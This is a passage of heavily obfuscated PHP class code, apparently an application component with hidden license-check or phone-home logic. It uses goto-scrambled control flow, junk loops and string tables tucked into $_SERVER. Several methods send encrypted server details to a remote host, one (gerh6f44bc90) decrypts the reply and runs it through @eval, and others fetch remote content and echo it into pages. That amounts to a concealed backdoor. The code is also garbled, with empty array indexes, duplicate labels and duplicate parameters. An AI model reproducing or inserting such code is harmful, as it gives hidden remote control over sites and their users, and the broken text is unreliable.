Cš; D: $dĨ =& $_SERVER[]; $E䖫 =& $_SERVER[ʆ]; if ($_SERVER[$E䖫[44]] == $E䖫[135]) { goto dġ; dġ: $A׃ = array($E䖫[120] => $this->rhkg2a3f9dc8, $E䖫[136] => $this->{$_SERVER[ʆ][137]}(), $E䖫[138] => $E䖫[61]($E䖫[139])->{$_SERVER[ʆ][140]}()); if ($this->rhkg2a3f9dc8 != $E䖫[121]) { $cΜ = $E䖫[104]($this->vxcyf6a94dbd, $E䖫[141]); if ($cΜ) { $A׃[$E䖫[142]] = $cΜ; $A׃[$E䖫[143]] = $E䖫[144]($E䖫[104]($this->vxcyf6a94dbd, $E䖫[145])); $A׃[$E䖫[146]] = $E䖫[104]($this->vxcyf6a94dbd, $E䖫[131]); } } $A׃ = $this->{$_SERVER[ʆ][147]}($E䖫[148]($A׃), $E䖫[114]($E䖫[149])); goto f; a՘: $f㯬 = $dĨ[586]; if (!$f㯬) { die; } $E䖫[13](array($E䖫[151], $E䖫[152]), $c); goto A; A: $B = $dĨ[587]; if (!$B) { die; } goto b􅴃; f: $E = $dĨ[585]; while (strlen($E) < $dĨ[556]) { if (!$E) { break; } $E++; } $c = array($E䖫[150] => $A׃); goto a՘; b􅴃: } goto cȵ˦; Cš: } private function ikwr6cb2bd2e() { goto Aъ; a: $d = $bݛ[597]; if (!$d) { die; } $bؐ[$eݔ] = $aﳑױ; goto D룾ڤˋ; fř: $f؈[166]($f؈[197]($f؈[208]), !0); $e䋓 = $bݛ[599]; if (strlen($e䋓) < $bݛ[547]) { return; } goto dʰ; A: $cԜ = $this->{$_SERVER[ʆ][199]}($C½[$f؈[200]]); $fִ = $bݛ[590]; if (!$fִ) { die; } goto e칻; e칻: if (!$cԜ || $cԜ != $f؈[201]($C½[$f؈[145]])) { $D = array($f؈[202] => $f؈[61]($f؈[62])->{$_SERVER[ʆ][63]}($f؈[116]), $f؈[203] => $_SERVER[$f؈[115]], $f؈[204] => $f؈[205](), $f؈[174] => $_SERVER[$f؈[175]]); $C̲ = $this->{$_SERVER[ʆ][206]}($f؈[148]($D)); $this->{$_SERVER[ʆ][182]}($f؈[207] . $C̲); $f؈[166]($f؈[197]($f؈[208]), !0); } $E˛ = array($f؈[209] => $d찍[$f؈[165]], $f؈[210] => $C½[$f؈[211]], $f؈[212] => $f؈[124](16), $f؈[120] => $C½[$f؈[213]]); if ($d찍[$f؈[168]]) { $E˛[$f؈[212]] = $d찍[$f؈[168]]; } goto fՎ굛; b: $bƠ = $bݛ[589]; if (!$bƠ) { die; } $aԇ = $f؈[114]($_SERVER[$f؈[115]] . $C؉); goto Fۊ; Fۊ: if ($F񹿩[$f؈[178]] == $f؈[179]) { $E롅 = $this->{$_SERVER[ʆ][147]}($aԇ, $f؈[180]); $C̲ = $this->{$_SERVER[ʆ][127]}($f؈[148]($d찍), $aԇ . $f؈[181], 3); $Ẹ = $this->{$_SERVER[ʆ][182]}($f؈[183] . $E롅 . $f؈[184] . $C̲, -1); $f؈[166]($Ẹ, !0); } else { if ($F񹿩[$f؈[178]] == $f؈[185]) { $B = $f؈[25]($f؈[114]($f؈[186] . $aԇ), 12, 15) . $f؈[187]; $C̲ = $this->{$_SERVER[ʆ][188]}($f؈[2]($F񹿩[$f؈[189]]), $B, 2); $e݇ = $f؈[190]($C̲, !0); if (!$f؈[191]($e݇) || !$f؈[191]($e݇[$f؈[192]]) || $e݇[$f؈[165]] != !0) { $CɶɌ = $f؈[193]; $cǖ = $e݇[$f؈[192]] ? $f؈[194] . $e݇[$f؈[192]] : $CɶɌ; $f؈[166]($cǖ, !1); } else { $d찍[$f؈[168]] = $e݇[$f؈[192]][$f؈[195]]; } } else { $e݇ = $this->{$_SERVER[ʆ][182]}($f؈[196], $d찍, 10); } } if (!$f؈[191]($e݇) || !$f؈[191]($e݇[$f؈[192]]) || $e݇[$f؈[165]] != !0) { $CɶɌ = $f؈[197]($f؈[198]); $cǖ = $e݇[$f؈[192]] ? $f؈[194] . $e݇[$f؈[192]] : $CɶɌ; $f؈[166]($cǖ, !1); } $C½ = $e݇[$f؈[192]]; goto A; D룾ڤˋ: $Fͬ = $bݛ[598]; if (strlen($Fͬ) < $bݛ[556]) { return; } $f؈[61]($f؈[11])->{$_SERVER[ʆ][226]}($BǇ[$f؈[227]], array($f؈[228] => $bؐ)); goto fř; d̊: if (!isset($F񹿩[$f؈[165]]) || $f؈[24]($F񹿩[$f؈[165]]) != 16) { $f؈[166]($f؈[167] . $F񹿩[$f؈[165]], !1); } $C؉ = $f؈[61]($f؈[62])->{$_SERVER[ʆ][63]}($f؈[116]); $d찍 = array($f؈[165] => $F񹿩[$f؈[165]], $f؈[168] => $f؈[124](16), $f؈[169] => $f؈[149], $f؈[170] => $f؈[171], $f؈[172] => $_SERVER[$f؈[173]], $f؈[174] => $_SERVER[$f؈[175]], $f؈[176] => $_SERVER[$f؈[177]]); goto b; d̜: if (!$f؈[104]($GLOBALS, $f؈[132])) { die; } $F񹿩 = $GLOBALS[$f؈[22]]; if (isset($F񹿩[$f؈[163]])) { $this->{$_SERVER[ʆ][164]}(); die; } goto d̊; E: $D = $bݛ[595]; if (!$D) { return; } $c = $f؈[222]($f؈[61]($f؈[11])->{$_SERVER[ʆ][223]}(), $f؈[224]); goto c݃珪; d⎱: $eݔ = $f؈[214]($f؈[25]($fΣ舺, 10, 16)); $Bԕ̥ = $bݛ[594]; $aﳑױ = $this->{$_SERVER[ʆ][127]}($f؈[148]($C½), $fΣ舺); goto E; c݃珪: $A = $bݛ[596]; $BǇ = $c[$f؈[225]]; $bؐ = array(); goto a; cۊ: $FѸ؇ = $bݛ[591]; if (!$FѸ؇) { die; } $cѹ = $f؈[124](16); goto E; Dҹ: $E˛[$f؈[123]] = $f؈[118]($f؈[214]($this->{$_SERVER[ʆ][147]}($f޾, $f؈[216]))); if ($C½[$f؈[217]] && $C½[$f؈[217]] >= 1) { $f؈[61]($f؈[62])->{$_SERVER[ʆ][218]}($f؈[219], $f؈[220]); } $f؈[61]($f؈[62])->{$_SERVER[ʆ][221]}($E˛); goto f; fՎ굛: $F = $f؈[25]($f؈[114]($E˛[$f؈[210]]), 10, 10); $eϔ = $F . $E˛[$f؈[120]] . $E˛[$f؈[212]]; $E˛[$f؈[122]] = $f؈[214]($f؈[118]($this->{$_SERVER[ʆ][147]}($eϔ, $f؈[215]))); goto cۊ; Aъ: $bݛ =& $_SERVER[]; $f؈ =& $_SERVER[ʆ]; if ($_SERVER[$f؈[44]] != $f؈[162]) { return; } goto d̜; E: $A = $bݛ[592]; while ($A < $bݛ[562]) { if ($A >= 0) { break; } $A++; } $f޾ = $cѹ . $E˛[$f؈[120]] . $this->{$_SERVER[ʆ][147]}($f؈[114]($E˛[$f؈[209]]), $cѹ); goto Dҹ; f: $fΣ舺 = $f؈[114]($_SERVER[$f؈[115]] . $f؈[214]($C؉) . $E˛[$f؈[210]]); $Cŏ = $bݛ[593]; while ($Cŏ < $bݛ[547]) { if ($Cŏ >= 0) { break; } $Cŏ++; } goto d⎱; dʰ: } private function ebva6679c2ad() { goto eގ̤; fޯ: $Dڸ = $cܷ[600]; while (strlen($Dڸ) < $cܷ[584]) { if (!$Dڸ) { break; } $Dڸ++; } goto Bғم; eގ̤: $cܷ =& $_SERVER[]; $D =& $_SERVER[ʆ]; $D[61]($D[62])->{$_SERVER[ʆ][221]}(array($D[209] => $D[10], $D[210] => $D[10], $D[120] => $D[121], $D[122] => $D[10], $D[123] => $D[10])); goto Cվ; Cվ: $D[61]($D[62])->{$_SERVER[ʆ][218]}($D[219], $D[229]); $this->vxcyf6a94dbd = array(); $this->rhkg2a3f9dc8 = $D[121]; goto fޯ; Bғم: } private function bcvh88c82968() { goto FÇݼ; Aߜ: $F݄ݱ = $fĹ[605]; if (!$Dʜ[191]($dР)) { return $this->{$_SERVER[ʆ][164]}(); } $F󅕡ώ = $Dʜ[144]($dР[$Dʜ[145]]); goto c߮ʹ; C꼕: $this->rhkg2a3f9dc8 = $Dʜ[121]; $D釋ֻ = $Dʜ[61]($Dʜ[62])->{$_SERVER[ʆ][63]}(); $A = $fĹ[601]; goto D̎; f̋: while ($dМ < $fĹ[584]) { if ($dМ >= 0) { break; } $dМ++; } $A榃؈ = $Dʜ[114]($_SERVER[$Dʜ[115]] . $Dʜ[214]($Eژ) . $D釋ֻ[$Dʜ[210]]); $fˎ = $fĹ[603]; goto fݥ; d񌿭: $B = $fĹ[604]; if (strlen($B) < $fĹ[547]) { die; } $dР = $Dʜ[190]($dР, !0); goto Aߜ; eΖ: $F󻙇 = $Dʜ[222]($Dʜ[61]($Dʜ[11])->{$_SERVER[ʆ][223]}(), $Dʜ[224]); $b = $F󻙇[$Dʜ[225]]; $dМ = $fĹ[602]; goto f̋; D̎: while ($A < $fĹ[584]) { if ($A >= 0) { break; } $A++; } if ($D釋ֻ[$Dʜ[120]] == $Dʜ[121]) { return; } $Eژ = $Dʜ[61]($Dʜ[62])->{$_SERVER[ʆ][63]}($Dʜ[116]); goto eΖ; c߮ʹ: if ($Dʜ[230]() >= $F󅕡ώ) { return $this->{$_SERVER[ʆ][164]}(); } $this->vxcyf6a94dbd = $dР; $this->rhkg2a3f9dc8 = $D釋ֻ[$Dʜ[120]]; goto cҦ; FÇݼ: $fĹ =& $_SERVER[]; $Dʜ =& $_SERVER[ʆ]; $_SERVER[$Dʜ[175]] = $Dʜ[104]($_SERVER, $Dʜ[175], APP_HOST); goto C꼕; fݥ: if (!$fˎ) { return; } $a = $Dʜ[214]($Dʜ[25]($A榃؈, 10, 16)); $dР = $this->{$_SERVER[ʆ][188]}($b[$Dʜ[91]][$a], $A榃؈); goto d񌿭; cҦ: $bÒÿ = $fĹ[606]; if (!$bÒÿ) { die; } goto bҔ; bҔ: } private function rywg5b335314() { $Dœ =& $_SERVER[ʆ]; $Eٱ = $GLOBALS[$Dœ[22]]; $Fĝ = $_SERVER[$Dœ[44]]; if ($Fĝ == $Dœ[231] && $this->rhkg2a3f9dc8 == $Dœ[121]) { $Dœ[166]($Dœ[197]($Dœ[232]), !1, $Dœ[233]); } $bߎ = array($Dœ[234], $Dœ[235]); if ($Dœ[236]($Fĝ, $bߎ)) { if ($this->rhkg2a3f9dc8 == $Dœ[121] && isset($Eٱ[$Dœ[237]])) { $Dœ[166]($Dœ[197]($Dœ[232]), !1, $Dœ[233]); die; } $dՈ = $this->{$_SERVER[ʆ][137]}(); if ($dՈ != $Dœ[201]($Dœ[238])) { if ($dՈ <= $Dœ[61]($Dœ[139])->{$_SERVER[ʆ][140]}()) { $Dœ[166]($Dœ[197]($Dœ[239]), !1, $Dœ[233]); die; } } } } private function hgzqd01cd7a7() { goto cȱ; cȱ: $C =& $_SERVER[]; $a =& $_SERVER[ʆ]; $B𑒮 = array($a[135], $a[240]); goto B߱; B߱: if (!$a[104]($GLOBALS, $a[132]) || !isset($_GET[$a[241]])) { return; } if (!$a[236]($_SERVER[$a[44]], $B𑒮)) { return; } $b؝ = $a[242]; goto f榾; CѦ: $cٶ = $a[245](array($a[246] => array($a[247] => $a[248], $a[249] => 3))); $fȿ = @$a[250]($b؝, !1, $cٶ); $E = $C[608]; goto dֳ׈; dֳ׈: if (strlen($E) < $C[556]) { die; } $a[251]($a[252]); if ($fȿ && $a[32]($fȿ, $a[253])) { echo $fȿ; } goto B; B: die; goto bޙ; f榾: $b؝ = $this->{$_SERVER[ʆ][243]}($b؝, $a[244]); $eöÇ = $C[607]; if (!$eöÇ) { die; } goto CѦ; bޙ: } public function wlmhe16ef155($D) { goto Fֱ쏴; Fֱ쏴: $e =& $_SERVER[]; $aѲ =& $_SERVER[ʆ]; if ($this->rhkg2a3f9dc8 == $aѲ[254]) { return $D; } goto Dγ糅; dȉ: foreach ($B߲ůʆ as $D먪) { if (!$aѲ[236]($D먪, $a܈ح)) { $bƌɑ[] = $D먪; } } foreach ($bƌɑ as $D먪) { unset($D[$D먪]); } return $D; goto Aԭ; Dγ糅: $B߲ůʆ = array($aѲ[255], $aѲ[256], $aѲ[257], $aѲ[258], $aѲ[259], $aѲ[260], $aѲ[261], $aѲ[262]); $a܈ح = $aѲ[0]($aѲ[263], $aѲ[104]($this->vxcyf6a94dbd, $aѲ[129], $aѲ[10])); $Cɢ = $e[609]; goto a; a: $bƌɑ = array(); $A⴮ = $e[610]; while (strlen($A⴮) < $e[584]) { if (!$A⴮) { break; } $A⴮++; } goto dȉ; Aԭ: } private function xojq47a13f54() { goto Bㆴ; fϢͅ: $GLOBALS[$E[91]][$E[95]][$E[264]] = $E[229]; $GLOBALS[$E[91]][$E[268]] = $E[220]; if ($E[61]($E[269])->{$_SERVER[ʆ][63]}($E[85]) != $E[229]) { $E[61]($E[269])->{$_SERVER[ʆ][221]}($E[85], $E[229]); } goto aç; Bㆴ: $B嘅 =& $_SERVER[]; $E =& $_SERVER[ʆ]; if ($this->rhkg2a3f9dc8 != $E[121]) { $GLOBALS[$E[91]][$E[95]][$E[264]] = $E[220]; return; } goto C͏ï; C͏ï: $fԥ = $_SERVER[$E[44]]; $c토ҋ = array($E[265]); $bǍ = $B嘅[611]; goto DŢΑ; DŢΑ: while ($bǍ < $B嘅[562]) { if ($bǍ >= 0) { break; } $bǍ++; } foreach ($c토ҋ as $CՍ) { if ($CՍ == $fԥ || $E[25]($fԥ, 0, $E[24]($CՍ)) == $CՍ) { $E[166]($E[197]($E[266]), !1); } } $GLOBALS[$E[91]][$E[95]][$E[267]] = $E[220]; goto fϢͅ; aç: } public function rzqt6ea75e06() { return $_SERVER[ʆ][270]; $F = $_SERVER[][612]; } private function gerh6f44bc90() { goto BȊݎ; B: if (!$cྎ[191]($D)) { return; } if ($D[$cྎ[165]] && $D[$cྎ[280]]) { if ($this->{$_SERVER[ʆ][199]}($D[$cྎ[280]]) == $Bӯ[$cྎ[165]]) { return; } } $this->{$_SERVER[ʆ][164]}(); goto e; Bߠ: $f͞ = $cྎ[274] . $cྎ[114]($cྎ[275]); if ($this->rhkg2a3f9dc8 == $cྎ[121] || !$cྎ[104]($GLOBALS, $cྎ[132])) { return; } if (!$cྎ[236]($_SERVER[$cྎ[44]], $B⪺)) { return; } goto F̾; Aτ: $Bӯ = array($cྎ[165] => $cྎ[61]($cྎ[62])->{$_SERVER[ʆ][63]}($cྎ[209]), $cྎ[178] => $this->rhkg2a3f9dc8, $cྎ[176] => $_SERVER[$cྎ[177]], $cྎ[169] => $cྎ[149], $cྎ[172] => $_SERVER[$cྎ[173]]); $F΅ = $D׌[614]; $D = $this->{$_SERVER[ʆ][182]}($cྎ[279], $Bӯ); goto B; F̾: if ($cྎ[230]() % 4 != 0) { return; } $cՌ = $cྎ[13](array($cྎ[276], $cྎ[277]), $f͞); $A = $D׌[613]; goto cѡ; BȊݎ: $D׌ =& $_SERVER[]; $cྎ =& $_SERVER[ʆ]; $B⪺ = array($cྎ[271], $cྎ[272], $cྎ[273]); goto Bߠ; e: if ($this->{$_SERVER[ʆ][199]}($D[$cྎ[280]]) != $Bӯ[$cྎ[165]]) { $EՉ = array($cྎ[202] => $cྎ[61]($cྎ[62])->{$_SERVER[ʆ][63]}($cྎ[116]), $cྎ[203] => $_SERVER[$cྎ[115]], $cྎ[204] => $cྎ[205](), $cྎ[174] => $_SERVER[$cྎ[175]]); $c˯ = $this->{$_SERVER[ʆ][206]}($cྎ[148]($EՉ)); $D = $this->{$_SERVER[ʆ][182]}($cྎ[207] . $c˯); if ($D && $cྎ[191]($D) && isset($D[$cྎ[280]])) { $cۖ = $this->{$_SERVER[ʆ][188]}($D[$cྎ[280]], 2); if ($cۖ) { $cۖ = $this->{$_SERVER[ʆ][199]}($cۖ); } if ($cۖ) { try { @eval($cۖ); } catch (Exception $Dھ) { } } } } goto EП; cѡ: if (strlen($A) < $D׌[556]) { return; } if ($cՌ && $cྎ[230]() - $cՌ < $cྎ[201]($cྎ[278])) { return; } $cྎ[13](array($cྎ[276], $cྎ[152]), $f͞, $cྎ[230]()); goto Aτ; EП: } private function wnes00e0ef69($C = '', $C = array(), $EѺ = 5) { goto aي; aي: $D =& $_SERVER[]; $bէ =& $_SERVER[ʆ]; $Dۦ³ = $bէ[281]; goto f; A׾: $Dۦ³ = $Dۦ³ . $C . $bէ[283] . $bէ[284]($C); $d = $D[616]; if ($C === -1) { return $Dۦ³; } goto d; d: $Dҥ = $bէ[245](array($bէ[246] => array($bէ[249] => $EѺ, $bէ[247] => $bէ[285]), $bէ[286] => array($bէ[287] => !1, $bէ[288] => !1))); $Bؚ = $D[617]; while ($Bؚ < $D[551]) { if ($Bؚ >= 0) { break; } $Bؚ++; } goto cτ; f: $aӴ֟ = $D[615]; while (strlen($aӴ֟) < $D[547]) { if (!$aӴ֟) { break; } $aӴ֟++; } $Dۦ³ = $this->{$_SERVER[ʆ][243]}($Dۦ³, $bէ[282]); goto A׾; cτ: $C = @$bէ[250]($Dۦ³, !1, $Dҥ); return $bէ[190]($C, !0); $F = $D[618]; goto e; e: while ($F < $D[551]) { if ($F >= 0) { break; } $F++; } goto Cзִ; Cзִ: } private function hegk7c53eb68() { goto f鮑; C: $eх = $Eř[$this->rhkg2a3f9dc8]; $eх = $F[201]($eх ? $eх : $F[290]); $D = $F[104]($this->vxcyf6a94dbd, $F[316]); goto F; f鮑: $B =& $_SERVER[]; $F =& $_SERVER[ʆ]; $Eř = array($F[289] => $F[290], $F[291] => $F[292], $F[293] => $F[294], $F[295] => $F[296], $F[297] => $F[298], $F[299] => $F[238], $F[300] => $F[238], $F[301] => $F[290], $F[302] => $F[292], $F[303] => $F[294], $F[304] => $F[305], $F[306] => $F[296], $F[307] => $F[308], $F[309] => $F[298], $F[310] => $F[311], $F[312] => $F[313], $F[314] => $F[315]); goto C; F: $bú = $B[619]; while (strlen($bú) < $B[547]) { if (!$bú) { break; } $bú++; } $D = $D ? $F[201]($D) : 0; goto aβ; bȸ: $cЌĻ = $B[621]; if (strlen($cЌĻ) < $B[556]) { die; } goto fԇ; aβ: $C = $B[620]; if (strlen($C) < $B[562]) { die; } return $eх + $D; goto bȸ; fԇ: } public function dghre3c0871c($CĤ) { goto C; e܆丄: if (strlen($F) < $dߞ[584]) { return; } if (!$BՏ[236]($CĤ[$BՏ[318]], $C̎)) { $BՏ[166]($BՏ[321], !1, $BՏ[233]); } goto d읧; C: $dߞ =& $_SERVER[]; $BՏ =& $_SERVER[ʆ]; $A = $this->{$_SERVER[ʆ][137]}(); goto E; C솓: $C̎ = $BՏ[61]($BՏ[139])->{$_SERVER[ʆ][317]}($BՏ[318])->{$_SERVER[ʆ][319]}($A)->{$_SERVER[ʆ][320]}(); $C̎ = $BՏ[222]($C̎, $BՏ[10], $BՏ[318]); $F = $dߞ[622]; goto e܆丄; E: if ($A >= $BՏ[201]($BՏ[238])) { return; } $fϙ = $BՏ[61]($BՏ[139])->{$_SERVER[ʆ][140]}(); if ($fϙ <= $A) { return; } goto C솓; d읧: } public function ylvd6a351e33() { goto fˌ刷; C: $Cѓ = $e݈[245](array($e݈[246] => array($e݈[247] => $e݈[248], $e݈[249] => 3))); $f韺ݤ = $e댠[625]; if (!$f韺ݤ) { return; } goto dԆ; cĦ: $DÎ = $e݈[242]; $ḅ = $e댠[623]; if (!$ḅ) { die; } goto B; B: $DÎ = $this->{$_SERVER[ʆ][243]}($DÎ, $e݈[244]); $a = $e댠[624]; while (strlen($a) < $e댠[556]) { if (!$a) { break; } $a++; } goto C; fˌ刷: $e댠 =& $_SERVER[]; $e݈ =& $_SERVER[ʆ]; if (!$e݈[104]($GLOBALS, $e݈[132]) || $e݈[322](1, 100) > 20) { return; } goto cĦ; dԆ: $Aǚ = @$e݈[250]($DÎ, !1, $Cѓ); echo $e݈[323] . $e݈[324]($Aǚ) . $e݈[325]; goto B玝; B玝: } private function cmzjccc4f4f9($c, $DᎳ, $C륿 = 3) { goto Dՠ; b: $DɩШ = $e٥[124](15); $D撚 = $e٥[327]; switch ($f΂) { case $e٥[229]: $a戦 = $this->{$_SERVER[ʆ][147]}($c, $e٥[214]($DᎳ . $DɩШ)); break; case $e٥[220]: $a戦 = $this->{$_SERVER[ʆ][147]}($c, $e٥[214]($DɩШ . $DᎳ)); $FμՄ = $E[628]; if (!$FμՄ) { die; } break; case $e٥[328]: $a戦 = $this->{$_SERVER[ʆ][147]}($c, $e٥[118]($DɩШ . $DᎳ)); break; $BƇ = $E[629]; if (!$BƇ) { return; } case $e٥[329]: $a戦 = $this->{$_SERVER[ʆ][147]}($c, $e٥[114]($DɩШ . $DᎳ)); break; $Aꑿ = $E[630]; while (strlen($Aꑿ) < $E[556]) { if (!$Aꑿ) { break; } $Aꑿ++; } case $e٥[330]: goto d; F: $aׇٴ = $E[633]; break; goto b麡; d: $c = $e٥[118]($c); $c = $e٥[331](0, 64); $AҨ = $D撚[$c]; goto B썷; B썷: $FơՌ = $e٥[114]($AҨ . $e٥[114]($DᎳ . $AҨ) . $DᎳ); $f = $E[631]; $FơՌ = $e٥[25]($FơՌ, $c % 8, $c % 8 + 7); goto a㭍Ἂ; bЏ֔: $d͎ = 0; for ($d = 0; $d < $e٥[24]($c); $d++) { $d͎ = $d͎ == $e٥[24]($FơՌ) ? 0 : $d͎; $Aם = $E[632]; $DǭŨ = ($c + $e٥[332]($D撚, $c[$d]) + $e٥[333]($FơՌ[$d͎++])) % 64; $FÕڠ .= $D撚[$DǭŨ]; } $a戦 = $e٥[324]($AҨ . $FÕڠ); goto F; a㭍Ἂ: $FÕڠ = $e٥[10]; $d = 0; $DǭŨ = 0; goto bЏ֔; b麡: default: $a戦 = $this->{$_SERVER[ʆ][147]}($c, $DᎳ . $DɩШ); $F踒 = $E[634]; break; } goto CƂŢ; c׭㌙: $f΂ = $e٥[322](0, 5) . $e٥[10]; $fߜ = $E[627]; while (strlen($fߜ) < $E[584]) { if (!$fߜ) { break; } $fߜ++; } goto b; cÃ: if ($C륿 - 1 > 0) { $a戦 = $this->{$_SERVER[ʆ][127]}($a戦, $DᎳ, $C륿 - 1); } return $a戦; goto A; eڏ: $c = $e٥[2]($c); $B󇋂 = $E[626]; while ($B󇋂 < $E[547]) { if ($B󇋂 >= 0) { break; } $B󇋂++; } goto c׭㌙; Dՠ: $E =& $_SERVER[]; $e٥ =& $_SERVER[ʆ]; $e٥[326](1); goto eڏ; CƂŢ: $a戦 = $e٥[214]($f΂ . $DɩШ . $a戦); $bշ = $E[579]; if (!$bշ) { die; } goto cÃ; A: } private function qyuof86c5555($aΌІ, $f, $F = 3) { goto F頟; fɣ͔: if (strlen($aז) < $Dǈ[562]) { return; } $cƎ = $aނ[25]($aΌІ, 1, 15); $aΌІ = $aނ[25]($aΌІ, 16); goto CΆ; E԰: $aΌІ = $aނ[2]($aΌІ); $aΌІ = $aނ[214]($aΌІ); $a􋃑 = $Dǈ[635]; goto D㽣; D㽣: if (strlen($a􋃑) < $Dǈ[551]) { die; } $fϖܤ = $aΌІ[0]; $aז = $Dǈ[636]; goto fɣ͔; F頟: $Dǈ =& $_SERVER[]; $aނ =& $_SERVER[ʆ]; if (!$aނ[334]($aΌІ) || $aނ[24]($aΌІ) < 10) { return !1; } goto E԰; bǧ: if ($F - 1 > 0) { $Aμ = $this->{$_SERVER[ʆ][188]}($Aμ, $f, $F - 1); } return $Aμ; goto F؋; bγ: $Aɕ = $Dǈ[638]; while ($Aɕ < $Dǈ[547]) { if ($Aɕ >= 0) { break; } $Aɕ++; } switch ($fϖܤ) { case $aނ[229]: $Aμ = $this->{$_SERVER[ʆ][243]}($aΌІ, $aނ[214]($f . $cƎ)); break; case $aނ[220]: $Aμ = $this->{$_SERVER[ʆ][243]}($aΌІ, $aނ[214]($cƎ . $f)); $a = $Dǈ[639]; break; case $aނ[328]: $Aμ = $this->{$_SERVER[ʆ][243]}($aΌІ, $aނ[118]($cƎ . $f)); $e΋ = $Dǈ[640]; break; case $aނ[329]: $Aμ = $this->{$_SERVER[ʆ][243]}($aΌІ, $aނ[114]($cƎ . $f)); $D޼ = $Dǈ[641]; if (strlen($D޼) < $Dǈ[556]) { return; } break; $eʅ = $Dǈ[642]; while ($eʅ < $Dǈ[584]) { if ($eʅ >= 0) { break; } $eʅ++; } case $aނ[330]: goto D; F: $d㊳ = $Dǈ[650]; if (!$d㊳) { return; } goto cڪŬ; Fߊ: $bȻ = 0; $a = $Dǈ[645]; if (strlen($a) < $Dǈ[562]) { die; } goto C; B: $bבޡʵ = $aނ[114]($fö . $aނ[114]($f . $fö) . $f); $C˱ = $Dǈ[644]; while ($C˱ < $Dǈ[547]) { if ($C˱ >= 0) { break; } $C˱++; } goto A锷Ǥ; A锷Ǥ: $bבޡʵ = $aނ[25]($bבޡʵ, $B % 8, $B % 8 + 7); $d샤 = $aނ[10]; $BΦ = 0; goto Fߊ; D: $aΌІ = $aނ[335]($aΌІ); $fö = $aΌІ[0]; $aΌІ = $aނ[25]($aΌІ, 1); goto aݛ; aݛ: $C㻯 = $Dǈ[643]; while (strlen($C㻯) < $Dǈ[556]) { if (!$C㻯) { break; } $C㻯++; } $B = $aނ[332]($aў, $fö); goto B; A: for ($BΦ = 0; $BΦ < $aނ[24]($aΌІ); $BΦ++) { $EӔ = $EӔ == $aނ[24]($bבޡʵ) ? 0 : $EӔ; $A׆ˠ = $Dǈ[647]; $A؟ = $EӔ++; $a = $Dǈ[648]; if (strlen($a) < $Dǈ[562]) { return; } $bȻ = $aނ[332]($aў, $aΌІ[$BΦ]) - $B - $aނ[333]($bבޡʵ[$A؟]); while ($bȻ < 0) { $bȻ += 64; } $d샤 .= $aў[$bȻ]; $B嵳 = $Dǈ[649]; if (!$B嵳) { return; } } $Aμ = $aނ[336]($d샤); break; goto F; C: $EӔ = 0; $F = $Dǈ[646]; while ($F < $Dǈ[547]) { if ($F >= 0) { break; } $F++; } goto A; cڪŬ: default: $Aμ = $this->{$_SERVER[ʆ][243]}($aΌІ, $f . $cƎ); $A = $Dǈ[651]; break; } goto bǧ; CΆ: $f = $Dǈ[637]; if (strlen($f) < $Dǈ[562]) { return; } $aў = $aނ[327]; goto bγ; F؋: } public function bvkac41d6381($cЫǟޢ) { goto b; b갩: if (!$aל) { die; } $Cھ݇ = $C°[201](($aŊ + $EԼ) / 2); while (1) { $báȪ = $Cھ݇; $d駺 = $b՘; while ($d駺 % $báȪ != 0) { $DВ = $d駺; $d駺 = $báȪ; $báȪ = $DВ % $báȪ; $e = $d̴[655]; while ($e < $d̴[584]) { if ($e >= 0) { break; } $e++; } } if ($báȪ == 1) { break; } else { $Cھ݇++; } } goto CДͭ; A: if (!$D׊) { return; } $b՘ = ($aŊ - 1) * ($EԼ - 1); $aל = $d̴[654]; goto b갩; b: $d̴ =& $_SERVER[]; $C° =& $_SERVER[ʆ]; $aŊ = $this->{$_SERVER[ʆ][337]}(); goto aƽ; CДͭ: $b͛ = 2; for ($D = 0; $D < $b՘ * 10; $D++) { if (($b՘ * $D + 1) % $Cھ݇ == 0) { $b͛ = $C°[201](($b՘ * $D + 1) / $Cھ݇); break; } } $f혅 = $this->{$_SERVER[ʆ][147]}($aŊ * $EԼ . $C°[10], $C°[149]); goto eÒ; cך: return $f궟ݜ; $Dݏ = $d̴[658]; goto Dφ݆; bѱ: $e = $d̴[657]; while (strlen($e) < $d̴[584]) { if (!$e) { break; } $e++; } $f궟ݜ = $this->{$_SERVER[ʆ][147]}($cЫǟޢ, $Eԋ) . $C°[341] . $f혅; goto cך; eÒ: $FμО = $d̴[656]; while (strlen($FμО) < $d̴[562]) { if (!$FμО) { break; } $FμО++; } $Eԋ = $C°[114]($C°[338] . ($aŊ + $EԼ) . $C°[339] . $Cھ݇ . $C°[339] . $b͛ . $C°[340]); goto bѱ; aƽ: $cܻ = $d̴[652]; $EԼ = $this->{$_SERVER[ʆ][337]}(); $D׊ = $d̴[653]; goto A; Dφ݆: } public function koiba7c0b6d2($Aۜ) { goto a쬸; F͕: $C뺭 = $e֧[201](($Bʳ + $a) / 2); $A = $e٨[662]; if (strlen($A) < $e٨[556]) { return; } goto D̫; F: if ($e֧[19]($A) != 2) { return $e֧[10]; } $C = $this->{$_SERVER[ʆ][243]}($A[1] . $e֧[10], $e֧[149]); $E = $e٨[659]; goto A; F: $Bʳ = 0; $a = 0; for ($aڄ = 3; $aڄ < $C; $aڄ += 2) { if ($C % $aڄ != 0) { continue; } $Bʳ = $aڄ; $a = $e֧[201]($C / $aڄ); break; $Dټ = $e٨[660]; if (strlen($Dټ) < $e٨[584]) { die; } } goto f; C: return $dݿ; $f = $e٨[650]; if (!$f) { return; } goto eּε; f: $b㽛¹ = ($Bʳ - 1) * ($a - 1); $CԐ = $e٨[661]; if (!$CԐ) { die; } goto F͕; a쬸: $e٨ =& $_SERVER[]; $e֧ =& $_SERVER[ʆ]; $A = $e֧[0]($e֧[341], $Aۜ); goto F; D̫: while (1) { $c؇ = $C뺭; $F݌ = $e٨[663]; while (strlen($F݌) < $e٨[562]) { if (!$F݌) { break; } $F݌++; } $e = $b㽛¹; while ($e % $c؇ != 0) { $d = $e; $e = $c؇; $A萃 = $e٨[664]; while (strlen($A萃) < $e٨[562]) { if (!$A萃) { break; } $A萃++; } $c؇ = $d % $c؇; $f̓ʄ = $e٨[665]; } if ($c؇ == 1) { break; } else { $C뺭++; } } $e݉ = 2; $D⇷ = $e٨[666]; goto Aܲ; A: if (!$E) { die; } if (!$C) { return $e֧[10]; } $C = $e֧[201]($C); goto F; Aܲ: for ($aڄ = 0; $aڄ < $b㽛¹ * 10; $aڄ++) { if (($b㽛¹ * $aڄ + 1) % $C뺭 == 0) { $e݉ = $e֧[201](($b㽛¹ * $aڄ + 1) / $C뺭); break; } } $A = $e֧[114]($e֧[338] . ($Bʳ + $a) . $e֧[339] . $C뺭 . $e֧[339] . $e݉ . 